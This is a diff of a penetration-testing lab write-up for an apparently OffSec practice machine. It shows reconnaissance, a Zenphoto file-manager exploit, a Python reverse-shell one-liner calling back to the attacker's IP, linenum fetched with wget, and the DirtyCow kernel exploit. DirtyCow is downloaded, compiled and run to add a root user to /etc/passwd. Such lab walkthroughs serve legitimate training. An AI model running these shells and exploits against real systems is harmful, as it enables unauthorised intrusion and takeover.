@@ -4,7 +4,7 @@
 
 ## nmap
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ rustscan -a 192.168.162.41                                                                                                                                 62 ⨯ 1 ⚙
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -160,7 +160,7 @@ Checking if the path in the exploit exists `{$path}zp-core/zp-extensions/tiny_mc
 ![](Pasted%20image%2020220129173441.png)
 
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Documents]
 └─$ searchsploit zenphoto 
 -------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -243,7 +243,7 @@ zenphoto-shell# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF
 
 ```
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -nlvp 443 
 [sudo] password for kali: 
@@ -295,7 +295,7 @@ www-data@offsecsrv:/home$
 # Privesc
 ## Enum
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ sudo python3 -m http.server 80                                                                                       
 [sudo] password for kali: 
@@ -305,7 +305,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 ### linenum
 
-```
+```bash
 www-data@offsecsrv:/tmp$ wget 192.168.49.51:8000/linenum.sh
 wget 192.168.49.51:8000/linenum.sh
 --2022-02-06 02:58:16--  http://192.168.49.51:8000/linenum.sh
@@ -1784,4 +1784,121 @@ www-data@offsecsrv:/tmp$
 
 ```
 
+# kernel Exploit
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 443                                   
+[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [192.168.49.140] from (UNKNOWN) [192.168.140.41] 49083
+<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ cd /tmp
+cd /tmp
+www-data@offsecsrv:/tmp$ uname -a
+uname -a
+Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
+www-data@offsecsrv:/tmp$ wget 192.168.49.140/40839.c
+wget 192.168.49.140/40839.c
+--2022-02-20 09:17:30--  http://192.168.49.140/40839.c
+Connecting to 192.168.49.140:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4814 (4.7K) [text/x-csrc]
+Saving to: `40839.c'
+
+100%[======================================>] 4,814       --.-K/s   in 0s      
+
+2022-02-20 09:17:31 (490 MB/s) - `40839.c' saved [4814/4814]
+
+www-data@offsecsrv:/tmp$ gcc 40839.c -o dirtycow -lcrypt -pthread
+gcc 40839.c -o dirtycow -lcrypt -pthread
+www-data@offsecsrv:/tmp$ ./dirtycow
+./dirtycow
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: password
+
+Complete line:
+firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
+
+mmap: b7868000
+
+
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'password'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+www-data@offsecsrv:/tmp$ 
+www-data@offsecsrv:/tmp$ madvise 0
+
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'password'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+
+
+www-data@offsecsrv:/tmp$ su firefart
+su firefart
+Password: password
+
+firefart@offsecsrv:/tmp# cd /root
+cd /root
+firefart@offsecsrv:~# cat proof.txt
+cat proof.txt
+f9664daf121e3cef5219c8b085992b05
+firefart@offsecsrv:~# ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:ba:1a:2f  
+          inet addr:192.168.140.41  Bcast:192.168.140.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feba:1a2f/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:795 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:239 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:97058 (97.0 KB)  TX bytes:28710 (28.7 KB)
+          Interrupt:18 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:40 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:40 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:4090 (4.0 KB)  TX bytes:4090 (4.0 KB)
+
+firefart@offsecsrv:~# 
+```
+
+![](Pasted%20image%2020220220172158.png)
+
 # Others
+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.140",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+```bash
+\e[97m[\e[93m*\e[97m] \e[90mpro020\e[97m Processes running with root permissions\e[90m.........................\e[36m yes!\e[0;0m
+\e[90m---\e[0;0m
+\e[32mSTART      PID     USER COMMAND
+\e[35m01:14 \e[0;0m    1639 \e[33m    root \e[0;0m/usr/sbin/sshd -D
+\e[35m01:12 \e[0;0m     913 \e[33m    root \e[0;0m/usr/sbin/cupsd -C /etc/cups/cupsd.conf
+\e[35m01:12 \e[0;0m     779 \e[33m    root \e[0;0mcron
+\e[35m01:12 \e[0;0m     778 \e[33m    root \e[0;0macpid -c /etc/acpi/events -s /var/run/acpid.socket
+\e[35m01:12 \e[0;0m     775 \e[33m    root \e[0;0m/sbin/getty -8 38400 tty6
+\e[35m01:12 \e[0;0m     772 \e[33m    root \e[0;0m/sbin/getty -8 38400 tty3
+\e[35m01:12 \e[0;0m     771 \e[33m    root \e[0;0m/sbin/getty -8 38400 tty2
+\e[35m01:12 \e[0;0m     763 \e[33m    root \e[0;0m/sbin/getty -8 38400 tty5
+\e[35m01:12 \e[0;0m     756 \e[33m    root \e[0;0m/sbin/getty -8 38400 tty4
+\e[35m01:12 \e[0;0m     708 \e[33m    root \e[0;0m/sbin/wpa_supplicant -u -s
+\e[35m01:12 \e[0;0m     702 \e[33m    root \e[0;0m/usr/sbin/modem-manager
+\e[35m01:12 \e[0;0m     700 \e[33m    root \e[0;0mNetworkManager
+\e[35m01:12 \e[0;0m     300 \e[33m    root \e[0;0mudevd --daemon
+\e[35m01:12 \e[0;0m     298 \e[33m    root \e[0;0mupstart-udev-bridge --daemon
+\e[35m01:12 \e[0;0m    1347 \e[33m    root \e[0;0m/sbin/getty -8 38400 tty1
+\e[35m01:12 \e[0;0m    1266 \e[33m    root \e[0;0m/usr/sbin/vmtoolsd
+\e[35m01:12 \e[0;0m    1220 \e[33m    root \e[0;0m/usr/sbin/apache2 -k start
+\e[35m01:12 \e[0;0m       1 \e[33m    root \e[0;0m/sbin/init
+\e[90m---\e[0;0m
+\e[97m[\e[93m*\e[97m] \e[90mpro030\e[97m Processes running by non-root users with shell\e[90m..................\e[36m yes!\e[0;0m
+\e[90m---\e[0;0m
+```
